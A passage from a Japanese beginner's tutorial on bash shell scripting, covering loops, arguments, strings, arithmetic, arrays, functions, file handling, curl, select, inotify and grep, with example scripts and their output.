./whileLoop.sh」コマンドを使用してスクリプトを実行ます。\n$ bash whileLoop.sh 1 2 3 4 5 6 7 8 9 $ Whileループでは、まず、条件が真かどうかをチェックします。\n条件がfalseの場合、ループから出てプログラムを終了します。\n条件が true の場合、実行シーケンスはキーワード \u0026lsquo;do\u0026rsquo; の後に書かれたステートメントに移動します。\n上記サンプルのは、「echo」により１から９までが出力されます。\nヒント ループ自体をループさせるincrementステートメントについて $(( )) は、括弧内で計算された値が引き出されます。 (( )) 内は、変数の冒頭に $ は必要ありません。 (( )) 内は、四則演算が可能です。スペースを空ける必要もありません。 until ループ: loopが条件がfalseのときにコードブロック(do\u0026hellip;doneで囲まれている)を実行し、条件がtrueになるまで実行し続けるまでループし続け、条件が true になると、until ループは終了します。\nuntilループの構文はwhileループの構文と同じで、「while」の代わりに「until」という言葉を使用します。\nターミナルで「$ ./untilLoop.sh」コマンドを使用してスクリプトを実行ます。\n#!/bin/bash number=1; until [ $number -ge 10 ]; do echo \u0026#34;$number\u0026#34;; number=$(( number+1 )); done 上記のコードを「untilLoop.sh」ファイルに保存します。コマンドを使って実行する\n$ bash untilLoop.sh 1 2 3 4 5 6 7 8 9 $ ヒント whileループは、条件が true の時に( do \u0026hellip;done) ブロックを実行し、条件が false になるとループを終了します。 untilループは、条件が false の時に( do \u0026hellip;done) ブロックを実行し、条件が true になるとループを終了します。 for ループ: forループは、繰り返し実行される条件を指定するループのタイプです。\nforループには、いくつかの記述方法があります。\n最初の方法として、反復用の数字を書きます。\n以下に示すコードでは、反復用の数字反復を制御する変数 \u0026lsquo;i\u0026rsquo; にさせます。\n以下のfor ループは 5 回実行されます。\nスクリプトファイル「helloScript.sh」にコードを保存します。\n#!/bin/bash for i in 1 2 3 4 5 ; do echo $i; done ターミナルで次のコマンドを入力して、「forLoop.sh」ファイルを実行します。\n$ bash forLoop.sh 1 2 3 4 5 $ この方法はシンプルに見えますが、1000回実行したい場合は、実行したい数値を列挙する必要があるため大変です。\n実は、1から1000までの反復回数を書く必要はなく、ループに他の書き方を使用します。\n以下のサンプルコード「for i in {0..10}」のように、反復の開始点と終了点を宣言します。\nこの書き方によってforループは10回実行されます。 \u0026lsquo;0\u0026rsquo; は開始点として定義され、\u0026lsquo;10\u0026rsquo; は反復の終了点として定義されます。\n#!/bin/bash for i in {0..10}; do echo $i; done ファイル「forLoop2.sh」にコードを保存します。ファイルを実行すると、次の出力が表示されます。\n$ bash forLoop2.sh 0 1 2 3 4 5 6 7 8 9 10 $ ループを制御する変数の増分値を定義することもできます。\nたとえば、「for i in {0..10..2}」では、\u0026lsquo;0\u0026rsquo; をループの開始点、\u0026lsquo;10\u0026rsquo; は終点、\u0026lsquo;2\u0026rsquo; はループは \u0026lsquo;i\u0026rsquo; 2の増分で、echo $i ステートメントを実行します。\nしたがって、以下に示す例では、プログラムはループの最初の実行で0を出力し、その後、「i」の値を２つずつインクリメントします。\nこのコードは、「i」の値を0,2,4,6,8,10として出力します。\n#!/bin/bash for i in {0..10..2}; do echo $i; done $ bash forLoop3.sh 0 2 4 6 8 10 $ 多くのプログラミング言語でおなじみ「for loop」書式の記述も可能です。\n以下のサンプルコードは、このメソッドを使用して「forループ」を書いています。\n\u0026lsquo;for (( i=0; i\u0026lt;5; i++ ))’ では、\u0026lsquo;i’ はループ全体を制御する変数です。\nまず、値 \u0026lsquo;i\u0026rsquo; は 値 \u0026lsquo;0\u0026rsquo; で初期化され、次にループ \u0026lsquo;i\u0026lt;5\u0026rsquo; の制御ステートメント、\u0026lsquo;i++\u0026rsquo; はループのたびに１つずつインクリメントする事をあわらします。\n#!/bin/bash for (( i=0; i\u0026lt;5; i++ )); do echo $i; done \u0026lsquo;i\u0026rsquo;は0で初期化され、\u0026lsquo;i\u0026rsquo;の値が5未満の条件をチェックします。\n最初条件の結果は \u0026rsquo;true\u0026rsquo; です。\n処理ステートメントに進み、、echo コマンドにより端末に「i」の値を「0」として出力します。\n処理が進むにつれ、値「i」が一つずつ増加します。\nプログラムは処理の中で、「i」の値が5未満であるかどうかを再度確認し、再び「i」の値(\u0026lsquo;1」を出力します。\nこの実行フローは、「i」の値が「5」の値に達するまで続き、「５」に達した段階ではforループをぬけてプログラムは終了します。\n$ bash increments.sh 0 1 2 3 4 $ breakとcontinue breakステートメントは、指定された条件でループを終了するために使用されます。\n以下に示すコードでは、for loopは if ステートメントの条件により、「i」の値が \u0026lsquo;5\u0026rsquo; になるまで通常の実行を行い、「i」が \u0026lsquo;5以上\u0026rsquo; ループを停止します。\n#!/bin/bash for (( i=0; i\u0026lt;=10; i++ )); do if [ $i -gt 5 ]; then break; fi echo $i; done スクリプトを保存し、ファイルを実行します。次の出力が得られます。\n$ bash break.sh 0 1 2 3 4 5 $ Continueステートメントは、breakステートメントとは対照的に機能します。\n条件が真である場合は反復をスキップ( continue )し、次の反復に向かって処理を進めます。\n以下のループは、\u0026lsquo;3\u0026rsquo; と \u0026lsquo;7\u0026rsquo; を除いて、\u0026lsquo;0\u0026rsquo; から \u0026lsquo;20\u0026rsquo; までの端末に \u0026lsquo;i\u0026rsquo; 変数の値を出力します。\nifステートメント \u0026lsquo;if [ $i -eq 3 ] || [ $i -eq 7 ]\u0026rsquo; は、\u0026lsquo;i\u0026rsquo; の値が 3 または 7 に等しいときは反復をスキップし、echoせずにforループの処理を進めます。\nこの概念をよりよく理解するために、次のコードを実行します。\n#!/bin/bash for (( i=0; i\u0026lt;=10; i++ )); do if [ $i -eq 3 ] || [ $i -eq 7 ]; then continue; fi echo $i; done $ bash continue.sh 0 1 2 4 5 6 8 9 10 $ 以下のように書くこともできます。こちらの記述のほうがすっきりしていて、Ｃ言語やＪａｖａに慣れ親しんでいる人は、直感的に理解できるかもしれません。\nfor (( i=0; i\u0026lt;=10; i++ )); do if (( i==3 || i==7 ));then continue; fi echo $i; done ヒント (( )) で囲む記述で書いていく方が良いかもしれません。 他の言語で慣れ親しんでいる書き方を踏襲することで、bash独特の書き方に振り回される事がないからです。 なにより、(( )) 内は、変数の冒頭に \u0026lsquo;$\u0026rsquo; が不要になるだけでも、コードが見やすくなります。 スクリプトへの値渡し「実行パラメータ」 このトピックの最初の例は、スクリプトを実行する際に、スクリプトへの入力として値を与えるための説明をします。\n#!/bin/bash echo $1 $2 $3; このコードは、端末に3つの値を出力します。\n上記のコードをスクリプト「input.sh」に保存します。実行時に実行ファイル名に続き、三つの値を指定して、スクリプトに値を渡します。\n$ bash input.sh BMW MERCEDES TOYOTA $ BMW MERCEDES TOYOTA $ スクリプト実行時に渡した３つの値はそれぞれコードの中で、「BMW」は「$1」、「MERCEDES」は「$2」、「TOYOTA」は「$3」に値は入力されます。\nechoステートメントに「$0」を指定すると、スクリプト名も出力されます。\n#!/bin/bash echo $0 $1 $2 $3; $ bash input2.sh BMW MERCEDES TOYOTA $ input2.sh BMW MERCEDES TOYOTA $ この目的のために配列を使用することもできます。\n配列を宣言するには、コード \u0026lsquo;args=(\u0026quot;$@\u0026quot;)\u0026rsquo; を使用します。\nこのコード \u0026lsquo;args\u0026rsquo; は配列の名前であり、\u0026rsquo;@\u0026rsquo; は無限の数の値を持つ可能性があることを表します。\nこのタイプの配列宣言は、入力のサイズがわからない場合に便利です。\n#!/bin/bash args=(\u0026#34;$@\u0026#34;); echo ${args[0]} ${args[1]} ${args[2]}; BMW\u0026rsquo;は${args[0]}、「MERCEDES」は${args[1]}、「HONDA」は${args[2]}を表します。\n$ bash args.sh BMW MERCEDES TOYOTA $ BMW MERCEDES TOYOTA $ 以下に示すコードは、無限の数の値を持つ配列の値を出力できます。\n前の例では、使用されるコマンド \u0026rsquo;echo ${args[0]} ${args[1]} ${args[2]}は配列の最初の3つの値のみを出力しますが、今回のコードは、出力を指定することなく、渡された値の全てを出力します。\n#!/bin/bash args=(\u0026#34;$@\u0026#34;) ; echo $@; $ bash args2.sh BMW MERCEDES TOYOTA BMW MERCEDES TOYOTA $ bash args2.sh BMW MERCEDES TOYOTA HONDA BMW MERCEDES TOYOTA HONDA $ \u0026rsquo;echo $#\u0026rsquo; と書いて配列サイズを出力することもできます。\n#!/bin/bash args=(\u0026#34;$@\u0026#34;); echo $@; echo $#; $ bash args3.sh BMW MERCEDES TOYOTA BMW MERCEDES TOYOTA 3 $ bash args3.sh BMW MERCEDES TOYOTA HONDA BMW MERCEDES TOYOTA HONDA 4 $ 文字列処理 文字列の比較 このトピックでは、文字列の比較を紹介します。\nプログラムは、ユーザーから2つの文字列入力を受け取ります。\nプログラムはそれぞれの値を読みこみ、２つの異なる変数 \u0026lsquo;st1\u0026rsquo; \u0026lsquo;st2\u0026rsquo; に格納します。\n両方の変数の値を比較するには、「if」ステートメントを使用し、条件文に「==」演算子で、二つの文字列が等価であるかを判定します。\n「else」ステートメントは、「文字列が一致しない」場合の処理を記述し、\u0026lsquo;if\u0026rsquo; ステートメントを閉じます。\n以下は、この手順全体のスクリプトコードです。\n#!/bin/bash echo \u0026#34;enter Ist string\u0026#34;; read st1; echo \u0026#34;enter 2nd string\u0026#34;; read st2; if [ \u0026#34;$st1\u0026#34; == \u0026#34;$st2\u0026#34; ]; then echo \u0026#34;strings match\u0026#34;; else echo \u0026#34;strings don\u0026#39;t match\u0026#34;; fi スクリプトを「string.sh」に保存します。ターミナルからファイルを実行し、比較のために2つの文字列を与えます。異なる入力を使用してコードをテストすることもできます。\n$ bash string.sh enter Ist string BMW enter 2nd string BMW strings match $ $ bash string.sh enter Ist string BMW enter 2nd string HONDA strings don\u0026#39;t match $ ヒント 文字列の比較は == です。 数値の比較は -eq -gt -lt -ge です。 -eq は[ == ] equals -gt は[ \u0026gt; ]greater than -lt は[ \u0026lt; ] less than -ge は[ \u0026gt;= ] greater equals です。 連結 2つの文字列を連結することもできます。\nプルグラムはユーザーへ入力を促し、２つの変数を \u0026lsquo;st1\u0026rsquo; \u0026lsquo;st2\u0026rsquo; 変数に格納します。\n#!/bin/bash echo \u0026#34;enter 1st string\u0026#34;; read st1; echo \u0026#34;enter 2nd string\u0026#34;; read st2; st3=\u0026#34;$st1 $st2\u0026#34;; echo $st3; このコードを「connect.sh」に保存し、端末を使用してファイルを実行し、結果を確認します。\n$ bash connect.sh enter 1st string BMW enter 2nd string HONDA BMW HONDA $ ヒント 文字列の結合時にそれぞれの変数の間に空白を起きたい場合は、以下のように二つの変数を「\u0026quot; \u0026ldquo;」ダブるクォーテーションで囲みます。 st3=\u0026quot;$st1 $st2\u0026rdquo;; 文字列を扱う場合、日頃から変数はダブルクォーテーションで囲む癖をつけておくべきです。\n変数への代入が「空（くうはく）」だった場合に、プログラムがバグにより停止します。 これは、文字列を扱う変数に限らず、次章で紹介する数値を格納する変数でも同じです。\n変数はつねに \u0026quot; \u0026quot; ダブルクオーテーションで囲みましょう。 数値計算処理 このトピックでは、スクリプトを使用してさまざまな数値演算を実行する方法を学習します。\n最初の方法では、２つの変数を値で定義し、echoステートメントと「+」演算子を使用してこれらの変数の合計を出力します。\n#!/bin/bash n1=4; n2=20; echo $(( n1 + n2 )); $ bash numberCalc.sh 24 $ 四則演算 加算、減算、乗算、除算などの複数の操作を実行するための単一のスクリプトを書くこともできます。\n#!/bin/bash n1=20; n2=4; echo $(( n1 + n2 )); echo $(( n1 - n2 )); echo $(( n1 * n2 )); echo $(( n1 / n2 )); echo $(( n1 % n2 )); $ bash numberCalc2.sh 24 16 80 5 0 $ 算術演算 exprコマンド 算術演算を実行する他の方法は、「expr」コマンドを使用することです。\nこの「expr」は、これらのn1とn2を他の変数とみなし、操作を実行することです。\n#!/bin/bash n1=20; n2=4; echo $(expr $n1 + $n2 ); $ bash numberCalc3.sh 24 $ 「expr」を使用して四則演算を処理してみます。\n#!/bin/bash n1=20; n2=4; echo $(expr $n1 + $n2 ); echo $(expr $n1 - $n2 ); echo $(expr $n1 \\* $n2 ); echo $(expr $n1 / $n2 ); echo $(expr $n1 % $n2 ); $ bash numberCalc4.sh 24 16 80 5 0 $ 小数点の扱い bcコマンド exprコマンドなどは小数演算できません。\nechoコマンドで数式を作成し、それをbcコマンドに渡して計算します。\n#!/bin/bash RESULT=`echo \u0026#34;scale=5; 10.0 / 3.0\u0026#34; | bc`; echo \u0026#34;$RESULT\u0026#34;; $ bash bc.sh 3.33333 $ bcコマンドでの小数点以下の指定桁数出力 演算の精度を保つため、上記のように計算は小数点以下5桁で行うけれど、表示は小数点以下2桁とかにしたい場合（桁数を指定したい場合）\n#!/bin/bash RESULT=`echo \u0026#34;scale=5; 10.0 / 3.0\u0026#34; | bc` printf \u0026#34;%.2f\u0026#34; $RESULT $ bash bc_f.sh 3.33 $ printf で桁数を指定します。\n実は、bcコマンドでも桁数を指定できます。\n#!/bin/bash # 先に紹介した方法 RESULT=`echo \u0026#34;scale=5; 10.0 / 3.0\u0026#34; | bc`; echo \u0026#34;$RESULT\u0026#34;; # printfコマンドで２桁にする RESULT=`echo \u0026#34;scale=5; 10.0 / 3.0\u0026#34; | bc`; printf \u0026#34;%.2f\\n\u0026#34; \u0026#34;$RESULT\u0026#34;; # bcコマンドで２桁にする RESULT=`echo \u0026#34;scale=2; 10.0 / 3.0\u0026#34; | bc`; echo \u0026#34;$RESULT\u0026#34;; $ bash bc_f.sh 3.33333 3.33 3.33 $ ヒント bcコマンドで小数点以下の桁数を指定するためには、scale= で指定します。 \u0026lsquo;;\u0026lsquo;セミコロンを忘れずに。 declareコマンド bashには変数の型(int char stringなど）がないため、bashで変数の型を制限することはできません。\nただし、型のような動作を許可することができます。\ndeclare [オプション] [変数名]=[値] グローバル変数とローカル変数 関数内で declare コマンドを使用すると、オプションがなければローカル変数として定義されます。-g オプションを使用すればスクリプト内のグローバルに変数を定義されます。スコープを明示しないと狭いスコープとなります。\n#!/bin/bash function set_my_value() { declare -x my_env_value=\u0026#39;ENV\u0026#39;; declare -g my_global_value=\u0026#39;GLOBAL\u0026#39;; declare my_local_value=\u0026#39;LOCAL\u0026#39;; my_value=\u0026#39;XXX\u0026#39;; } set_my_value; echo $my_env_value; echo $my_global_value; echo $my_local_value; echo $my_value; 結果は以下の通りです。\n$ bash declare.sh GLOBAL XXX $ 整数として変数定義する -i を付ければ整数として変数を定義できます。\n#!/bin/bash # -i で整数として変数を定義 $ declare -i num=001 $ echo $num $ bash declare_i.sh 1 $ # -i がないと文字列となるのでそのまま $ declare str=001 $ decho $str $ echo $str $ bash declare_no_i.sh 001 $ オプションまとめ delcare -a: 配列を定義 delcare -i: 整数として定義 delcare -r: 読み取り専用変数として定義 delcare -g: 関数内で使用時、グローバル変数として定義 配列 配列を宣言し、その中に値を格納する方法を学びます。\n好きなだけ値を保存できます。\n配列の名前を書き、その値を「( )」括弧で定義します。\n#!/bin/bash car=(\u0026#39;BMW\u0026#39; \u0026#39;TOYOTA\u0026#39; \u0026#39;HONDA\u0026#39;); echo \u0026#34;${car[@]}\u0026#34;; $ bash array.sh BMW TOYOTA HONDA $ 「BMW」が「0」番目のインデックスに格納され、「TOYOTA」が「1」番目のインデックスに格納され、「HONDA」が「2」番目のインデックスに格納されます。\n「BMW」を出力する場合は、${car[0]}と書きます。\n#!/bin/bash car=(\u0026#39;BMW\u0026#39; \u0026#39;TOYOTA\u0026#39; \u0026#39;HONDA\u0026#39;); echo \u0026#34;${car[@]}\u0026#34;; #printing value by using index echo \u0026#34;printing value using index\u0026#34;; echo \u0026#34;${car[0]}\u0026#34;; echo \u0026#34;${car[1]}\u0026#34;; echo \u0026#34;${car[2]}\u0026#34;; $ bash array2.sh BMW TOYOTA HONDA printing value using index BMW TOYOTA HONDA $ 配列のインデックスを印刷することもできます。\n#!/bin/bash car=(\u0026#39;BMW\u0026#39; \u0026#39;TOYOTA\u0026#39; \u0026#39;HONDA\u0026#39;); echo \u0026#34;${car[@]}\u0026#34;; echo \u0026#34;printing the indexes\u0026#34;; echo \u0026#34;${!car[@]}\u0026#34;; $ bash array3.sh BMW TOYOTA HONDA printing the indexes 0 1 2 $ 配列内の値の合計数を印刷する場合は、ここに「${#car[@]}」と書くだけで、要素の総数を表します。\n#!/bin/bash car=(\u0026#39;BMW\u0026#39; \u0026#39;TOYOTA\u0026#39; \u0026#39;HONDA\u0026#39; \u0026#39;ROVER\u0026#39;); echo \u0026#34;${car[@]}\u0026#34;; echo \u0026#34;printing the indexes\u0026#34;; echo \u0026#34;${!car[@]}\u0026#34;; echo \u0026#34;printing number of values\u0026#34;; echo \u0026#34;${#car[@]}\u0026#34;; $ bash array4.sh BMW TOYOTA HONDA ROVER printing the indexes 0 1 2 3 printing number of values 4 $ 配列内にある任意の要素を削除したいとします。\n要素を削除するには、配列名と削除する要素のインデックスを含む「unset」コマンドを使用します。\n「car」配列の2番目のインデックスに格納されている値を削除する場合は、スクリプトに「unset car[2]」と書くだけです。\n#!/bin/bash car=(\u0026#39;BMW\u0026#39; \u0026#39;TOYOTA\u0026#39; \u0026#39;HONDA\u0026#39; \u0026#39;ROVER\u0026#39;) unset car[2] echo \u0026#34;${car[@]}\u0026#34; echo \u0026#34;printing the indexes\u0026#34; echo \u0026#34;${!car[@]}\u0026#34; echo \u0026#34;printing number of values\u0026#34; echo \u0026#34;${#car[@]}\u0026#34; 次のコードを「helloScript.sh」に保存します。「./helloScript.sh」を使用してファイルを実行します。\n配列要素を削除することはわかりました。\nでは「MERCEDES」などの他の値をインデックス2に格納する場合はどうしましょう。\nunsetコマンドを使用した後、次の行に「car[2]=\u0026lsquo;MERCEDES」と書きます。\n#!/bin/bash car=(\u0026#39;BMW\u0026#39; \u0026#39;TOYOTA\u0026#39; \u0026#39;HONDA\u0026#39; \u0026#39;ROVER\u0026#39;) # 2のHONDAを削除 unset car[2] # 2に値をセット car[2]=\u0026#39;MERCEDES\u0026#39; echo \u0026#34;${car[@]}\u0026#34; echo \u0026#34;printing the indexes\u0026#34; echo \u0026#34;${!car[@]}\u0026#34; echo \u0026#34;printing number of values\u0026#34; echo \u0026#34;${#car[@]}\u0026#34; $ bash array5.sh BMW TOYOTA MERCEDES ROVER printing the indexes 0 1 2 3 printing number of values 4 $ 関数 関数は基本的に再利用可能なコード行です。何度も呼び出すことができます。\n特定の操作を何度も実行する場合、または特定の処理を何度も実行する場合、関数は、何度も何度も同じコードを書くための時間と労力を軽減します。\n以下は関数の構文を示す例です。\n覚えておくべき最も重要なことの1つは、関数を呼び出す前にコーディングのどこかで最初に関数を定義または宣言する必要があることです。\nコードで関数を定義するには、３つのステップが必要です。\nステップ1は、指定する関数名の前に「function」コマンドを書き関数名を宣言し、後ろに「()」を書きます。\nステップ2は、処理ブロックは「{」ではじまり、「 }」で閉じられた内側ににコードを書くことです。\nステップ3は、function 関数名() で宣言した下の行で実行したい関数名を使用して関数を呼び出すことです。\n#!/bin/bash # 関数の宣言 function funcName(){ echo \u0026#34;this is new function\u0026#34;; } # 関数呼び出し funcName; $ bash method.sh this is new function $ 関数にパラメータを与えることもできます。\nたとえば、関数呼び出し時に与えられる任意の単語を引数として指定します。\n関数呼び出しの関数名の後ろに、文字列を指定して関数に渡します。\n渡された関数は、一つ目のパラメータを $1 として処理を続ける事ができます。\n#!/bin/bash function funcPrint(){ echo \u0026#34;$1\u0026#34;; } funcPrint \u0026#34;BashScript\u0026#34;; $ bash method2.sh BashScript $ 複数のパラメータを扱う場合、$1, $2などの変数名は区別がつきにくく、コードが混乱する場合が多いので、変数に代入すると、扱いやすくなります。\n#!/bin/bash function funcPrint(){ name=\u0026#34;$1\u0026#34;; age=\u0026#34;$2\u0026#34;; echo \u0026#34;$name is $age years old.\u0026#34;; } funcPrint \u0026#34;BashScript\u0026#34; 24 ; $ bash method2.sh BashScript is 24 years old. $ 関数内で宣言される変数はローカル変数です。 というのは一般的なプログラム言語ですが、シェルスクリプトBashはグローバル変数しかありません。関数の中で宣言しても、関数の外で宣言しても、いずれもグローバル変数です。 先に紹介した declare -g を使うことにより、グローバル変数とローカル変数を明確に区別することができます。 例えば、以下のソースでは、関数実行前に「I love Mac」を変数に格納し、出力します。 その後、関数を呼び出し、同変数に「I love Linux」を変数に代入すると、Ｃ言語やＪａｖａなどは、ローカル変数に格納した値は、グローバル変数に影響しない訳ですが、シェルスクリプトBashは、もろに影響します。理由は全てグローバル扱いだからです。 ``` bash:global_local.sh #!/bin/bash function funcCheck(){ returningValue=\u0026#34;I love Linux\u0026#34;; } returningValue=\u0026#34;I love MAC\u0026#34;; echo $returningValue; #\u0026gt; I love Mac funcCheck; echo $returningValue; #\u0026gt; I love Linux $ bash global_local.sh I love MAC I love Linux $ ファイルとディレクトリ このトピックでは、\n１．ファイルとディレクトリを作成する方法、\n２．スクリプトを使用してこれらのファイルとディレクトリの存在を確認する方法、\n３．ファイルからテキストを1行ずつ読み取る方法、\n４．ファイルにテキストを追加する方法、\n５．ファイルを削除する方法、\nを紹介します。\nディレクトリ操作 最初のスクリプトは、「Directory2」という名前のディレクトリを作成します。\n\u0026lsquo;mkdir\u0026rsquo; コマンドでディレクトリを作成します。\nすでに同じディレクトリに「Directory2」フォルダーがある場合はエラーとなります。\nエラーに対処するためには、\u0026rsquo;-p\u0026rsquo; オプションを使います。\n\u0026lsquo;-p\u0026rsquo; オプションは、作成しようとするその場所に、作成したいディレクトリ名が既に存在している場合は、なにもしません。ディレクトリが存在しない場合のみ、新しいディレクトリを作成します。\n#!/bin/bash mkdir -p Directory2 現在の場所にディレクトリが存在するかどうかをif文で確認することもできます。\n「if」ステートメントでディレクトリが存在するかどうかをチェックするためにはif文の条件式で「-d」フラグを使用します。\n#!/bin/bash echo \u0026#34;enter directory name to check\u0026#34;; read direct; if [ -d \u0026#34;$direct\u0026#34; ]; then echo \u0026#34;$direct exists\u0026#34; else echo \u0026#34;$direct doesn\u0026#39;t exist\u0026#34; fi ファイル操作 ファイルの作成には「touch」コマンドを使います。\nヒント ディレクトリの作成には \u0026lsquo;mkdir\u0026rsquo; コマンド、 ファイルの作成には \u0026rsquo;touch\u0026rsquo; コマンドを使います。 #!/bin/bash echo \u0026#34;enter file name to create\u0026#34;; read fileName; touch $fileName; touchコマンドはmkdirコマンド同様、ファイルを作成しようとするその場所に、既に作成しようとするファイル明度同名のファイルが存在した場合、何もしません。\nmkdir は、ディレクトリを作成する。同名のディレクトリがあればエラーとなります。\nls directory2/ $ mkdir directory2 mkdir: directory2: File exists $ そこで、mkdir -p コマンドは、同名のディレクトリが既にあればエラーを返さず何もしない。なければディレクトリを作成。\ntouchコマンドも同様で、同名のファイルが既にあればエラーを返さず何もせず、なければファイルを作成します。\nヒント touchコマンドは既に同名のファイルがあれば、エラーを返さない代わりに何もしませんが、「:\u0026gt;」コマンドでファイルを作成した場合、既に作成しようとするその場所に同名のファイルがあった場合、空の新規ファイルで上書きします。（ですので、ファイルは強制的に作成されますが、データ内容は消滅します。 if文で -d フラグでディレクトリの存在を確認する事ができました。\nファイルも同様に -f フラグでファイルの存在を確認する事ができます。\n#!/bin/bash echo \u0026#34;enter file name to check\u0026#34;; read fileName; if [ -f \u0026#34;$fileName\u0026#34; ]; then; echo \u0026#34;$fileName exists\u0026#34;; else echo \u0026#34;$fileName doesn\u0026#39;t exist\u0026#34;; fi テキストへのファイル出力 ファイルにテキストを追加するには、「\u0026gt;」リダイレクト、または「\u0026raquo;」アペンドを使います。\n「\u0026gt;」リダイレクトは、ファイルを新規に作成し直してから出力します。\n「\u0026raquo;」アペンドは、既にファイルが存在しているときに限定して出力します。\nヒント 「\u0026gt;」リダイレクトは、既にファイルが存在している場合も、ファイルを新規作成します。ですので、元々あったファイルの内容は空になります。からになってもらっては困ると言う場合は、「touch」コマンドを使います。 また、「\u0026raquo;」アペンドは、追記する場合に、ファイルがない場合はエラーとなります。こうした事にならないように、次の例文で、ファイルの存在を確認して処理を進めます。\n#!/bin/bash echo \u0026#34;入力ファイル名を指定して下さい\u0026#34;; read fileName; echo \u0026#34;ファイルに追記したい文字列を入力して下さい\u0026#34;; read fileText; # ファイルがあれば if [ -f \u0026#34;$fileName\u0026#34; ]; then # アペンド echo \u0026#34;アペンドします\u0026#34;; echo \u0026#34;$fileText\u0026#34; \u0026gt;\u0026gt; $fileName else # リダイレクト echo \u0026#34;リダイレクトします\u0026#34;; echo \u0026#34;$fileText\u0026#34; \u0026gt; $fileName fi ファイルの読み込み スクリプトを使用して任意のファイルを読み取ることもできます。上記の方法に従ってファイルを見つけます。その後、while条件を使用して「read -r line」を使用してファイルを読み取る。ファイルを読み取るので、このシンボル「\u0026lt;」を使用します。\necho \u0026#34;読み込みたいファイル名を指定して下さい\u0026#34;; read fileName; # ファイルがあれば if [ -f \u0026#34;$fileName\u0026#34; ]; then # 読み込む while read line; do echo \u0026#34;$line\u0026#34;; done\u0026lt;$fileName else echo \u0026#34;$fileName は存在しません\u0026#34;; fi ファイルを削除するには、まずファイルが存在するかどうかを調べることです。\n#!/bin/bash echo \u0026#34;enter file name from which you want to delete\u0026#34;; read fileName; if [ -f \u0026#34;$fileName\u0026#34; ]; then rm $fileName; else echo \u0026#34;$fileName doesn\u0026#39;t exist\u0026#34;; fi ヒント rmコマンドは非常に危険なコマンドです。 ファイルの削除の都度確認を促す -i オプションをつけるなどをするとよいでしょう。 rmコマンドは、ファイルだけではなくディレクトリも削除できます。 再帰的に行いたい場合は、-r オプションをつけると良いです。 curlコマンド カールは、URL構文を持つデータファイルを取得、または送信するためのコマンドです。\nまず最初にしなければならないことはcurlをインストールすることです。\n# 確認 which curl /usr/bin/curl $ ない場合、\n# macの場合 $ sudo brew install curl # linuxの場合 $ yum install curl curlをインストールした後、URLを使ってファイルをダウンロードするためのコードを記述します。\ncurlを使用してデータファイルをダウンロードするには２つのステップが必要です。\n１つ目は、そのファイルの完全なリンクアドレスを持つことです。\n２つ目は、そのアドレスをスクリプトの「url」変数に保存し、そのURLでcurlコマンドを使用してダウンロードすることです。ここで「-O」は、ダウンロードするファイル名は、実在のファイル名を継承すると言う意味となります。\n#!/bin/bash url=\u0026#34;http://www.ovh.net/files/1Mb.dat\u0026#34;; curl ${url} -O; ダウンロードしたファイルに新しい名前を与えるには、「-o」オプションでファイル名を指定します。\n#!/bin/bash url=\u0026#34;http://www.ovh.net/files/1Mb.dat\u0026#34;; curl ${url} -o NewFileDownload; 数百ギガバイトのサイズのファイルをダウンロードしたい場合はどうでしょう。\n適切なファイルをダウンロードしているかどうかを確認するためにヘッダーファイルをダウンロードすることができます。\nファイルのURLの前に「-I」と書くだけです。\n#!/bin/bash url=\u0026#34;http://www.ovh.net/files/1Mb.dat\u0026#34;; curl -I ${url}; selectコマンド selectコマンドは、列挙したリストを表示させ、ユーザーに入力を促します。\n#!/bin/bash select car in BMW MERCEDES TESLA ROVER TOYOTA; do echo \u0026#34;you have selected $car\u0026#34;; done $ bash select.sh 1) BMW\t3) TESLA\t5) TOYOTA 2) MERCEDES 4) ROVER #? 3 you have selected TESLA #? 4 you have selected ROVER #? この場合、選択した車のオプションが表示されますが、オプション以外の番号を入力すると何もしません。\n以下の例では、swich-caseを使用して、ユーザーが他の車のオプションを入力した場合、「1から5の間で選択してください」というエラーメッセージが表示されます。\n#!/bin/bash select car in BMW MERCEDES TESLA ROVER TOYOTA; do case $car in BMW) echo \u0026#34;BMW SELECTED\u0026#34;;; MERCEDES) echo \u0026#34;MERCEDES SELECTED\u0026#34;;; TESLA) echo \u0026#34;TESLA SELECTED\u0026#34;;; ROVER) echo \u0026#34;ROVER SELECTED\u0026#34;;; TOYOTA) echo \u0026#34;TOYOTA SELECTED\u0026#34;;; *) echo \u0026#34;ERROR! Please select between 1 to 5\u0026#34;;; esac done プロのメニューでは、プログラムはユーザーの入力を待つ必要があります。\nこのスクリプトでは、ユーザーに「続行するには任意のキーを押して」ように依頼し、「read -t 3 -n 1」コマンドを使用して3秒ごとにユーザーに「キーSirを押すのを待っています」というリマインダーを送信します。\n#!/bin/bash echo \u0026#34;press any key to continue\u0026#34;; while [ true ]; do # ３秒ごとに入力を促す read -t 3 -n 1; if [ $? = 0 ]; then echo \u0026#34;you have terminated the script\u0026#34;; exit; else echo \u0026#34;waiting for you to press the key Sir\u0026#34; fi done inotifyコマンド ファイルの変更を監視する inotifyを使用してファイルを変更を監視するする方法を説明します。\ninotifyの正式名称は「inode notify」です。\ninotifyは、ファイルシステムの変更を監視し、、変更をアプリケーションに報告するLinuxカーネルサブシステムです。inotifyを操作するには、まずターミナルからinotifyをインストールする必要があります。\nLinuxの場合\n$ yum install inotify-tools inotifyがどのように反応するかを確認します。\n#!/bin/bash mkdir -p iNotifyTest inotifywait -m iNotifyTest では、ターミナルの出力を確認します。\nターミナルをもう一つ起動して上記スクリプトを実行しているターミナルと並べて開きます。\nモニターとしてのinotify.shの動作を見ながら別のターミナルウィンドウを開き、「$ touch file1.txt」でファイルを作成すると、inotifyが反応し、ファイルシステムで現在起こっているすべてのアクションを監視していることがわかります。\n次に「file1.txt」に何かを書き、inotifyで動作するターミナルウィンドウからの応答を確認してください。\ngrepコマンド grepコマンドについてはここで詳しく書きました。\n【 grep 特集】「ざっくりわかるシェルスクリプト４」\nそれはそれとして、ここではざっくりと説明します。\ngrepは ‘global regular expression print’ の略です。\nこのコマンドは、テキストを1行ずつ処理してファイル内のパターンを検索するために使用されます。\nまず、touchコマンドを使用してfilegrep.txtという名前のファイルを作成します。ターミナルに次のコードを入力します。\n$ touch filegrep.txt $ vim filegrep.txt filegrep.txtを開き、ファイルに次のコンテンツを書き込みます。\nThis is Linux This is Windows This is MAC This is Linux This is Windows This is MAC This is Linux This is Windows This is MAC This is Linux This is Windows This is MAC #!/bin/bash echo \u0026#34;検索したいファイル名を指定して下さい。\u0026#34; # 入力を grepfile.txt read fileName if [[ -f \u0026#34;$fileName\u0026#34; ]]; then echo \u0026#34;検索したい語句を入力して下さい。\u0026#34;; read grepvar; grep 